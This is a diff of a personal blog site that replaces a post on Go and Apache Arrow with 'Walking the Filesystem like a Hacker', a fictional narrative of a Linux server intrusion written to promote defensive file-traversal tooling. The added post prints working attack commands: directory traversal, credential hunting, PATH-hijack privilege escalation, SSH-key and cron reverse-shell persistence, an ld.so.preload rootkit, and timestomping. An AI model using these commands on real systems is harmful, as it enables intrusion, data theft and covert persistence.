@@ -12,13 +12,11 @@
         <meta name="author" content="Thomas F McGeehan V">
       
       
-        <link rel="canonical" href="https://tfmv.github.io/blog/blog-posts/go-arrow/">
+        <link rel="canonical" href="https://tfmv.github.io/blog/blog-posts/fs-hacker/">
       
       
-        <link rel="prev" href="../billion/">
+        <link rel="prev" href="../unilateral-bond/">
       
-      
-        <link rel="next" href="../time-machine/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -26,7 +24,7 @@
     
     
       
-        <title>Go and Arrow - Blog - Thomas F McGeehan V</title>
+        <title>Walking the Filesystem like a Hacker - Blog - Thomas F McGeehan V</title>
       
     
     
@@ -71,11 +69,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="Go and Arrow - Blog - Thomas F McGeehan V" >
+        <meta  property="og:title"  content="Walking the Filesystem like a Hacker - Blog - Thomas F McGeehan V" >
       
         <meta  property="og:description"  content="Personal blog by Thomas F McGeehan V" >
       
-        <meta  property="og:image"  content="https://tfmv.github.io/blog/assets/images/social/blog-posts/go-arrow.png" >
+        <meta  property="og:image"  content="https://tfmv.github.io/blog/assets/images/social/blog-posts/fs-hacker.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -83,15 +81,15 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://tfmv.github.io/blog/blog-posts/go-arrow/" >
+        <meta  property="og:url"  content="https://tfmv.github.io/blog/blog-posts/fs-hacker/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="Go and Arrow - Blog - Thomas F McGeehan V" >
+        <meta  name="twitter:title"  content="Walking the Filesystem like a Hacker - Blog - Thomas F McGeehan V" >
       
         <meta  name="twitter:description"  content="Personal blog by Thomas F McGeehan V" >
       
-        <meta  name="twitter:image"  content="https://tfmv.github.io/blog/assets/images/social/blog-posts/go-arrow.png" >
+        <meta  name="twitter:image"  content="https://tfmv.github.io/blog/assets/images/social/blog-posts/fs-hacker.png" >
       
     
     
@@ -114,7 +112,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#when-go-meets-arrow-a-data-engineering-love-story" class="md-skip">
+        <a href="#walking-the-file-system-like-a-hacker" class="md-skip">
           Skip to content
         </a>
       
@@ -148,7 +146,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Go and Arrow
+              Walking the Filesystem like a Hacker
             
           </span>
         </div>
@@ -491,19 +489,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../go-arrow/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -513,7 +502,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -611,10 +599,19 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../fs-hacker/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -624,6 +621,7 @@
   
 
       </a>
+      
     </li>
   
 
@@ -673,121 +671,170 @@
   
 
 
-<h1 id="when-go-meets-arrow-a-data-engineering-love-story">When Go Meets Arrow: A Data Engineering Love Story?<a class="headerlink" href="#when-go-meets-arrow-a-data-engineering-love-story" title="Permanent link">#</a></h1>
-<p><em>Published on Feb 27, 2025</em></p>
-<p>What happens when a concurrency champ like Go meets a columnar king like Arrow — synergy or stalemate? Right now? More of a sleeper hit than a showstopper — but the pieces are there. Apache Arrow and Go sit at a curious crossroads in modern data processing: one a language-agnostic powerhouse for in-memory analytics, the other a fast, concurrent workhorse reshaping data engineering. Go&rsquo;s traction in real-time pipelines is climbing, yet open-source projects leaning on Arrow-Go are few and far between. Meanwhile, Arrow&rsquo;s influence in analytics grows, with sharper performance and deeper Go integration in its latest releases. Let&rsquo;s unpack where these two stand, how Arrow-Go fits (or doesn&rsquo;t), and whether they&rsquo;re poised to converge or drift apart.</p>
-<h2 id="gos-growing-role-in-data-engineering">Go&rsquo;s Growing Role in Data Engineering<a class="headerlink" href="#gos-growing-role-in-data-engineering" title="Permanent link">#</a></h2>
-<p>Go (or Golang), birthed at Google and open-sourced in 2009, compiles to native code, outpacing interpreted languages like Python. Its syntax is lean, its concurrency (goroutines, channels) is a breeze compared to thread-heavy alternatives, and its static binaries, though chunky, deploy without fuss. The Go Gopher? A cute mascot for a language that&rsquo;s all about getting shit done, fast.</p>
-<p>In data engineering, Go&rsquo;s shining in real-time pipelines — think parsing 100k events per second where Python chokes on memory overhead or Logstash hogs resources (see Medium&rsquo;s take on Go for data engineering).</p>
-<h2 id="recent-advancements-in-go-for-data-engineering">Recent Advancements in Go for Data Engineering<a class="headerlink" href="#recent-advancements-in-go-for-data-engineering" title="Permanent link">#</a></h2>
-<p>Go keeps sharpening its edge for data workloads. Go 1.24 introduces performance and memory improvements that align well with Apache Arrow-Go&rsquo;s compute-heavy tasks.</p>
-<p>🔹 Smarter CPU Utilization: Profile-Guided Optimization (PGO), introduced in Go 1.22, can squeeze out 2–7% better CPU performance, a crucial boost for Arrow-Go&rsquo;s columnar transformations.</p>
-<p>🔹 Generics for Cleaner Data Structures: Since Go 1.18, generics have made it easier to build type-safe, flexible data structures — helpful for Arrow array builders that previously relied on clunky interfaces.</p>
-<p>🔹 Lower Contention in Concurrent Workloads: sync.Map tweaks across recent releases have cut contention in concurrent metadata caching — a win for Arrow-Go pipelines juggling shared state.</p>
-<p>🔹 Leaner Text Parsing for Arrow Ingestion: Community chatter hints at faster text streaming, with new iterator functions (Lines, SplitSeq) reducing overhead when converting CSV/JSON into Arrow arrays.</p>
-<h2 id="the-unseen-backbone-of-high-performance-analytics">The Unseen Backbone of High-Performance Analytics<a class="headerlink" href="#the-unseen-backbone-of-high-performance-analytics" title="Permanent link">#</a></h2>
-<p>Apache Arrow is a columnar memory standard that kills inefficiencies in row-based processing. Zero-copy data sharing? Check. Vectorized execution for analytics and ML? Yup. Cross-language glue for C++, Python, Rust, Java, and Go? Absolutely. It&rsquo;s the quiet engine in tools like Spark, Dremio, DuckDB, and Polars — even creeping into ML frameworks like TensorFlow. Go&rsquo;s role in this party? Still figuring out its dance moves.</p>
-<h2 id="how-traditional-data-structures-differ-from-apache-arrow">How Traditional Data Structures Differ from Apache Arrow<a class="headerlink" href="#how-traditional-data-structures-differ-from-apache-arrow" title="Permanent link">#</a></h2>
-<h3 id="1-row-based-vs-columnar-storage">1. Row-Based vs. Columnar Storage<a class="headerlink" href="#1-row-based-vs-columnar-storage" title="Permanent link">#</a></h3>
-<p>Let&rsquo;s look at how the same data is stored in both formats:</p>
-<h4 id="row-based-storage">Row-Based Storage<a class="headerlink" href="#row-based-storage" title="Permanent link">#</a></h4>
-<div class="highlight"><pre><span></span><code>┌────────────────────────────────────┐
-│ ID: 1  │ Name: Alice  │ Age: 25    │
-│ ID: 2  │ Name: Bob    │ Age: 30    │
-│ ID: 3  │ Name: Carol  │ Age: 22    │
-│ ID: 4  │ Name: Dave   │ Age: 27    │
-└────────────────────────────────────┘
+<h1 id="walking-the-file-system-like-a-hacker">Walking the File System Like a Hacker<a class="headerlink" href="#walking-the-file-system-like-a-hacker" title="Permanent link">#</a></h1>
+<h2 id="a-modern-hacking-ops-mission">A Modern Hacking Ops Mission<a class="headerlink" href="#a-modern-hacking-ops-mission" title="Permanent link">#</a></h2>
+<h3 id="mission-briefing">Mission Briefing<a class="headerlink" href="#mission-briefing" title="Permanent link">#</a></h3>
+<p>In cybersecurity, file system traversal is the equivalent of tactical movement in hostile terrain — searching, probing, and exploiting while evading detection. Modern adversaries have elevated file system traversal into an art form, leveraging Living-Off-The-Land Binaries (LOLBins), stealthy privilege escalation exploits, and rootkits that make them ghosts within the system. Speed and efficiency are paramount. Slow operations get attackers caught. Slow responses get defenders breached.</p>
+<p>Knowledge of the file system is power. In the right hands, a single file can be a kill switch, a backdoor, or a direct path to root control.</p>
+<p>This mission log is a behind-the-scenes look at a fictional — but highly realistic — hacking operation. Red Fox, a well-funded adversary group, is targeting a corporate research server. Their point man, Ghost, moves with precision and intent, using modern techniques that mirror real-world breaches.</p>
+<h2 id="phase-one-initial-breach">Phase One: Initial Breach<a class="headerlink" href="#phase-one-initial-breach" title="Permanent link">#</a></h2>
+<p><strong>Target</strong>: A high-value Linux server hosting confidential research.</p>
+<p><strong>Entry Point</strong>: Web application vulnerability.</p>
+<p><strong>Objective</strong>: Establish a foothold, remain undetected, and conduct rapid reconnaissance.</p>
+<p>Ghost identifies a directory traversal vulnerability in the target&rsquo;s web application — a gaping side door into the fortress. With a crafted URL, he tricks the web server into exposing the /etc/passwd file:</p>
+<div class="highlight"><pre><span></span><code>GET<span class="w"> </span>/downloads/../../../../etc/passwd<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span>target.corp
 </code></pre></div>
-<p><strong>Pros &amp; Cons:</strong><br />
-✅ Perfect for grabbing a single user&rsquo;s complete record<br />
-❌ Not great for analytics (like finding average age)</p>
-<h4 id="columnar-storage-apache-arrow">Columnar Storage (Apache Arrow)<a class="headerlink" href="#columnar-storage-apache-arrow" title="Permanent link">#</a></h4>
-<div class="highlight"><pre><span></span><code>┌─ ID ──┐    ┌─ Name ─┐    ┌─ Age ─┐
-│   1   │    │ Alice  │    │  25   │
-│   2   │    │ Bob    │    │  30   │
-│   3   │    │ Carol  │    │  22   │
-│   4   │    │ Dave   │    │  27   │
-└───────┘    └────────┘    └───────┘
+<p>The response confirms the vulnerability. System user accounts spill onto his screen. Mission go.</p>
+<p>He quickly doubles down — using the same exploit to pull application configuration files. Success. Database credentials are exposed. Using these, he pivots — SSHing into the server as webadmin.</p>
+<p>The initial foothold is secure.</p>
+<h2 id="phase-two-reconnaissance">Phase Two: Reconnaissance<a class="headerlink" href="#phase-two-reconnaissance" title="Permanent link">#</a></h2>
+<p>An attacker&rsquo;s first 15 minutes on a compromised system are make-or-break.</p>
+<p>They need to:</p>
+<ul>
+<li>Determine the environment → Workstation, server, or container?</li>
+<li>Identify the OS → Different OSes require different techniques.</li>
+<li>Map the filesystem layout → Where are the valuable files?</li>
+</ul>
+<p>Ghost moves like a special operations unit in urban combat — methodically clearing each directory, prioritizing high-value targets.</p>
+<h3 id="intel-gathering">Intel Gathering<a class="headerlink" href="#intel-gathering" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Establishing orientation</span>
+uname<span class="w"> </span>-a
+whoami<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">pwd</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/home
+ls<span class="w"> </span>-la<span class="w"> </span>/var/www
+cat<span class="w"> </span>/etc/os-release
+find<span class="w"> </span>/etc<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.conf&quot;</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-mtime<span class="w"> </span>-7
 </code></pre></div>
-<p><strong>Pros &amp; Cons:</strong><br />
-✅ Blazing fast for analytics (just grab the Age column)<br />
-✅ CPU-friendly (SIMD operations on continuous memory)</p>
-<h3 id="2-why-columnar-storage-is-faster-for-analytics">2. Why Columnar Storage is Faster for Analytics<a class="headerlink" href="#2-why-columnar-storage-is-faster-for-analytics" title="Permanent link">#</a></h3>
-<p>Imagine querying the average age of all users.</p>
-<p>Row-Based Storage: The database reads every row, parsing unnecessary fields like ID and Name, leading to cache inefficiency.<br />
-Columnar Storage: Only the Age column is read, enabling faster, parallelized execution using vectorized processing.</p>
-<p>This is why Arrow&rsquo;s columnar format is widely used in modern analytics — it allows for:<br />
-✅ Zero-copy sharing between systems (no serialization overhead)<br />
-✅ Parallel query execution (SIMD, CPU cache locality)<br />
-✅ Optimized memory access for large-scale data analytics</p>
-<h3 id="3-arrows-in-memory-format-zero-copy-data-access">3. Arrow&rsquo;s In-Memory Format: Zero-Copy Data Access<a class="headerlink" href="#3-arrows-in-memory-format-zero-copy-data-access" title="Permanent link">#</a></h3>
-<p>Traditional systems serialize data when transferring between applications (e.g., converting a Pandas DataFrame into a JSON payload). This slows down performance due to encoding/decoding overhead.</p>
-<p>Apache Arrow eliminates this with a standard in-memory format, enabling zero-copy reads across systems. This means data can be shared across Python, Go, Rust, and Java without any serialization/deserialization overhead.</p>
-<p>Example Use Cases:<br />
-🔹 Pandas → Go: A Python ML model can generate a dataset and pass it directly to a Go-based API using Arrow IPC — no need for JSON or CSV conversion.<br />
-🔹 Query Engines (Dremio, DuckDB): Many modern databases use Arrow internally for high-performance, vectorized query execution.</p>
-<h2 id="arrow-go-is-it-underrated-or-just-underused">Arrow-Go: Is It Underrated or Just Underused?<a class="headerlink" href="#arrow-go-is-it-underrated-or-just-underused" title="Permanent link">#</a></h2>
-<p>The stars are finally aligning for Arrow-Go. Apache Arrow 18.0.0 was the breakthrough: breaking free from the monorepo unleashed faster updates, expanded compute functions, and tighter Parquet integration. But the real game-changer? The c2goasm optimizations that finally let Arrow-Go flex its performance muscle.</p>
-<p>Why now? Two forces are converging:</p>
-<ol>
-<li>Arrow-Go&rsquo;s hitting its stride with battle-tested stability and near-native performance</li>
-<li>Go&rsquo;s exploding in real-time data processing where Arrow shines brightest</li>
-</ol>
-<p>Yet in the open-source world, Arrow-Go&rsquo;s still the wallflower at the data engineering dance. Rust powers DataFusion&rsquo;s query engine and Polars&rsquo; backend, Python leans on Arrow for Pandas, but Go? It mostly sticks to C++ bindings over its own Arrow-Go implementation.</p>
-<p>Why? Memory friction.</p>
-<h3 id="memory-management-in-arrow-go">Memory Management in Arrow-Go<a class="headerlink" href="#memory-management-in-arrow-go" title="Permanent link">#</a></h3>
-<p>Here&rsquo;s a simple example showing how we handle memory in Arrow-Go:</p>
-<div class="highlight"><pre><span></span><code><span class="c1">// Create a new builder for int64 values</span>
-<span class="nx">bldr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">array</span><span class="p">.</span><span class="nx">NewInt64Builder</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nx">DefaultAllocator</span><span class="p">)</span>
-<span class="k">defer</span><span class="w"> </span><span class="nx">bldr</span><span class="p">.</span><span class="nx">Release</span><span class="p">()</span><span class="w">  </span><span class="c1">// 👈 Don&#39;t forget to release!</span>
-
-<span class="c1">// Add some numbers</span>
-<span class="nx">bldr</span><span class="p">.</span><span class="nx">AppendValues</span><span class="p">([]</span><span class="kt">int64</span><span class="p">{</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">},</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span>
-
-<span class="c1">// Build the array (also needs releasing)</span>
-<span class="nx">arr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">bldr</span><span class="p">.</span><span class="nx">NewInt64Array</span><span class="p">()</span>
-<span class="k">defer</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">Release</span><span class="p">()</span><span class="w">  </span><span class="c1">// 👈 Memory cleanup is manual</span>
-
-<span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span><span class="w">  </span><span class="c1">// [1 2 3]</span>
+<h3 id="system-wide-scans">System Wide Scans<a class="headerlink" href="#system-wide-scans" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Searching for sensitive files</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*pass*&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;AWS_SECRET&quot;</span><span class="w"> </span>/home<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/opt<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.sql&quot;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.db&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
 </code></pre></div>
-<p>While this manual memory management adds friction, it also allows fine-grained control over performance, which can be a huge advantage in high-throughput, memory-sensitive workloads.</p>
-<p>Underrated? Maybe. Underused? Definitely.</p>
-<h2 id="wheres-arrow-go-actually-being-used-not-many-places">Where&rsquo;s Arrow-Go Actually Being Used? (Not Many Places)<a class="headerlink" href="#wheres-arrow-go-actually-being-used-not-many-places" title="Permanent link">#</a></h2>
-<p>Arrow-Go&rsquo;s footprint in open source is thin. It&rsquo;s alive in Apache Arrow&rsquo;s core (GitHub: apache/arrow-go), but beyond testing, it&rsquo;s mostly silent.</p>
-<p>InfluxDB chipped in contributions, yet still leans on C++ for the heavy lifting (InfluxData blog). Dremio and UKV ride Arrow&rsquo;s wave, just not in Go.</p>
-<p>One standout? Voltron Data, which touts Arrow-Go for efficient data pipelines (Voltron Data blog).</p>
-<p>But here&rsquo;s the kicker: there&rsquo;s no Go-native equivalent of Pandas or Polars. Not even close. A few GitHub repos are taking early shots (arrow-dataframe-go, go-polars), but this space is WIDE open. If you&rsquo;re building data tools in Go, this isn&rsquo;t just an opportunity—it&rsquo;s a frontier waiting for its pioneer.</p>
-<h2 id="where-go-and-arrow-could-and-should-converge">Where Go and Arrow Could (and Should) Converge<a class="headerlink" href="#where-go-and-arrow-could-and-should-converge" title="Permanent link">#</a></h2>
-<p>Three game-changing opportunities where Go + Arrow could shine:</p>
-<h3 id="real-time-analytics">🚀 Real-Time Analytics<a class="headerlink" href="#real-time-analytics" title="Permanent link">#</a></h3>
-<p><strong>The Stack:</strong> Goroutines + Arrow&rsquo;s Flight RPC<br />
-<strong>The Magic:</strong> Think sub-millisecond data transfers that would make your DBA weep with joy. We&rsquo;re talking:</p>
+<p><strong>Hit.</strong></p>
+<p>An <code>/opt/backups/db_backup.sql</code> file, containing database connection strings.</p>
+<p>Another foothold.</p>
+<h3 id="the-filesystem-tells-stories">The Filesystem Tells Stories<a class="headerlink" href="#the-filesystem-tells-stories" title="Permanent link">#</a></h3>
+<p>Ghost knows that filesystems are narrative archives — they tell stories about user behavior, system operations, and security posture:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Finding recently modified files—signs of activity</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-mtime<span class="w"> </span>-1<span class="w"> </span>-not<span class="w"> </span>-path<span class="w"> </span><span class="s2">&quot;/proc/*&quot;</span><span class="w"> </span>-not<span class="w"> </span>-path<span class="w"> </span><span class="s2">&quot;/sys/*&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Identifying large files—potential data stores</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-size<span class="w"> </span>+100M<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Locating world-writable directories—potential staging areas</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-perm<span class="w"> </span>-o+w<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p>Each command reveals another chapter in the system&rsquo;s story. Ghost reads between the lines, building a mental map of the target environment.</p>
+<h2 id="phase-three-privilege-escalation">Phase Three: Privilege Escalation<a class="headerlink" href="#phase-three-privilege-escalation" title="Permanent link">#</a></h2>
+<p>Intel suggests a weakness. Ghost hunts for privilege escalation paths.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Scanning for SUID binaries (potential root escalations)</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Hit.</strong></p>
+<p><code>/usr/local/bin/backup.sh</code> — a script running with SUID privileges (executed as root).</p>
+<p><strong>Problem</strong>: The script calls tar without specifying a full path.</p>
+<p><strong>Solution</strong>: Ghost hijacks tar, tricking the system into running his script as root.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/tar
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/tar
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+/usr/local/bin/backup.sh
+</code></pre></div>
+<p><strong>Result</strong>: A root shell.</p>
+<p>He&rsquo;s inside the command center.</p>
+<p>Once privileges are escalated, attackers begin searching for sensitive data:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Hunting for high-value targets</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-size<span class="w"> </span>+1G<span class="w"> </span>-mtime<span class="w"> </span>-180<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Hit.</strong></p>
+<p>A directory named <code>/research/archive</code> catches his eye—inside, a 12GB encrypted disk image (confidential.img).</p>
+<p>Ghost doesn&rsquo;t need to crack the encryption now — that would take time and CPU cycles. Instead, he duplicates the raw disk image for offline decryption.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Quietly copying the encrypted disk image</span>
+dd<span class="w"> </span><span class="k">if</span><span class="o">=</span>/research/archive/confidential.img<span class="w"> </span><span class="nv">of</span><span class="o">=</span>/dev/shm/exfil.img<span class="w"> </span><span class="nv">bs</span><span class="o">=</span>4M<span class="w"> </span><span class="nv">status</span><span class="o">=</span>none
+</code></pre></div>
+<p>No logs. No traces. Writing to <code>/dev/shm</code> keeps the stolen data in memory, avoiding disk writes that might trigger alerts.</p>
+<h3 id="the-kernels-blind-spots">The Kernel&rsquo;s Blind Spots<a class="headerlink" href="#the-kernels-blind-spots" title="Permanent link">#</a></h3>
+<p>Ghost knows that Linux has inherent blind spots — areas where the kernel implicitly trusts user input:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Checking for vulnerable kernel modules</span>
+lsmod<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;vulnerable_module&quot;</span>
+
+<span class="c1"># Looking for writable service configuration files</span>
+find<span class="w"> </span>/etc/systemd<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Identifying misconfigured capabilities</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p>These commands expose the system&rsquo;s trust architecture — revealing where Ghost can manipulate the kernel&rsquo;s decision-making process.</p>
+<h2 id="phase-four-persistence">Phase Four: Persistence<a class="headerlink" href="#phase-four-persistence" title="Permanent link">#</a></h2>
+<p>Now Ghost locks down his access.</p>
+<h3 id="1-planting-a-silent-backdoor">1️⃣ Planting a Silent Backdoor<a class="headerlink" href="#1-planting-a-silent-backdoor" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Injecting SSH keys for persistent access</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-rsa AAAAB3Nz...[attacker_key]...&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.ssh/authorized_keys
+</code></pre></div>
+<p><strong>Result</strong>: Even if credentials change, Ghost retains root access.</p>
+<h3 id="2-covert-task-execution-cron-job-persistence">2️⃣ Covert Task Execution (Cron Job Persistence)<a class="headerlink" href="#2-covert-task-execution-cron-job-persistence" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Setting a reverse shell trigger every minute</span>
+<span class="o">(</span>crontab<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;* * * * * nc 10.0.0.123 4444 -e /bin/sh&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>crontab<span class="w"> </span>-
+</code></pre></div>
+<p><strong>Result</strong>: A quiet fail-safe. Even if Ghost loses his shell, the system will call him back — again and again.</p>
+<h3 id="3-deploying-a-rootkit-for-stealth">3️⃣ Deploying a Rootkit for Stealth<a class="headerlink" href="#3-deploying-a-rootkit-for-stealth" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Modifying /etc/ld.so.preload to hijack system calls</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;/lib/libghost.so&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
+</code></pre></div>
+<p><strong>Result</strong>: Processes, logs, and file changes disappear.</p>
+<p>Rootkits like this are virtually undetectable without advanced monitoring.</p>
+<blockquote>
+<p><strong>Modern TTPs Note</strong> → While rootkits remain viable, sophisticated adversaries often favor malware-free persistence methods like cloud service abuse, credential stuffing, or modifying legitimate system daemons. The techniques shown here represent just one approach in an evolving threat landscape.</p>
+</blockquote>
+<h3 id="the-art-of-hiding-in-plain-sight">The Art of Hiding in Plain Sight<a class="headerlink" href="#the-art-of-hiding-in-plain-sight" title="Permanent link">#</a></h3>
+<p>Ghost employs advanced techniques to blend into the system&rsquo;s normal operations:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Timestomping—matching file timestamps to hide modifications</span>
+touch<span class="w"> </span>-r<span class="w"> </span>/bin/bash<span class="w"> </span>/lib/libghost.so
+
+<span class="c1"># Creating hidden directories that most tools ignore</span>
+mkdir<span class="w"> </span><span class="s2">&quot; \t\n&quot;</span>
+
+<span class="c1"># Embedding backdoor in legitimate binaries</span>
+objcopy<span class="w"> </span>--add-section<span class="w"> </span>.backdoor<span class="o">=</span>/tmp/payload<span class="w"> </span>--set-section-flags<span class="w"> </span>.backdoor<span class="o">=</span>noload,readonly<span class="w"> </span>/bin/ls<span class="w"> </span>/bin/ls.modified
+</code></pre></div>
+<p>These techniques exploit how administrators and security tools interact with the filesystem — hiding malicious activity in the cognitive blind spots of defenders.</p>
+<blockquote>
+<p><strong>Real-World Parallel</strong> → APT38, a state-sponsored North Korean threat actor, has used similar file system reconnaissance and privilege escalation techniques to infiltrate financial institutions, mirroring Ghost&rsquo;s tactics here. Their ability to rapidly enumerate systems and move laterally is what makes them so dangerous. But defenders who move faster — leveraging automated file traversal — can cut off attackers before they establish persistence.</p>
+</blockquote>
+<h2 id="the-filesystem-arms-race">The Filesystem Arms Race<a class="headerlink" href="#the-filesystem-arms-race" title="Permanent link">#</a></h2>
+<p>Ghost&rsquo;s success was a mix of precision, speed, and stealth. But defenders can turn the tables with the right tools.</p>
+<p>The battlefield is asymmetric:</p>
 <ul>
-<li>Lightning-fast IoT sensor processing</li>
-<li>High-frequency trading systems that actually keep up</li>
-<li>Real-time fraud detection that catches things before they happen</li>
+<li>🔻 <strong>Attackers</strong>: Need only one weakness.</li>
+<li>
+<p>🔹 <strong>Defenders</strong>: Must cover everything.</p>
+</li>
+<li>
+<p>🔻 <strong>Attackers</strong>: Operate with surgical precision on a single target.</p>
+</li>
+<li>
+<p>🔹 <strong>Defenders</strong>: Must maintain vigilance across thousands of systems.</p>
+</li>
+<li>
+<p>🔻 <strong>Attackers</strong>: Choose when to strike.</p>
+</li>
+<li>
+<p>🔹 <strong>Defenders</strong>: Must be alert 24/7.</p>
+</li>
+<li>
+<p>🔻 <strong>Attackers</strong>: Can abandon failed attempts.</p>
+</li>
+<li>🔹 <strong>Defenders</strong>: Can never abandon their posts.</li>
 </ul>
-<h3 id="edge-computing">🌍 Edge Computing<a class="headerlink" href="#edge-computing" title="Permanent link">#</a></h3>
-<p><strong>The Stack:</strong> Go&rsquo;s tiny footprint × Arrow-Go&rsquo;s memory efficiency<br />
-<strong>The Magic:</strong> Edge nodes that punch above their weight:</p>
+<p>But defenders have one critical advantage: scale.</p>
+<p>While Ghost manually traverses one system at a time, defenders can deploy Filewalker across an entire enterprise simultaneously.</p>
+<h3 id="the-solution">The Solution<a class="headerlink" href="#the-solution" title="Permanent link">#</a></h3>
 <ul>
-<li>Crunch complex analytics on Raspberry Pis</li>
-<li>Process satellite data right where it lands</li>
-<li>Turn resource constraints from limiting to liberating</li>
+<li>✅ Scale your reconnaissance.</li>
+<li>✅ Automate your threat hunting.</li>
+<li>✅ Stay faster than the attacker.</li>
 </ul>
-<h3 id="data-interchange">🔄 Data Interchange<a class="headerlink" href="#data-interchange" title="Permanent link">#</a></h3>
-<p><strong>The Stack:</strong> Zero-copy bridge between ecosystems<br />
-<strong>The Magic:</strong> The dream of seamless data flow:</p>
-<ul>
-<li>ML models in Python? ➡️ Go services? No sweat</li>
-<li>Streaming analytics without the serialization tax</li>
-<li>Cross-language pipelines that just work</li>
-</ul>
-<hr />
-<p>Go&rsquo;s charging into data engineering with speed and simplicity, Arrow&rsquo;s rewriting analytics from the memory up, and Arrow-Go? A sleeper hit waiting for its moment.</p>
-<p>Real-time, edge, data interchange — the pieces fit, but open-source hasn&rsquo;t fully bitten. Is it Go&rsquo;s young data ecosystem holding it back, or just a visibility glitch?</p>
-<p>Arrow-Go isn&rsquo;t missing features—it&rsquo;s missing champions. The foundation is solid, the timing is right, and the opportunity is massive.</p>
-<p>Time to stop waiting and start building. Your move, gophers.</p>
 
 
 
@@ -808,7 +855,7 @@ Columnar Storage: Only the Age column is read, enabling faster, parallelized exe
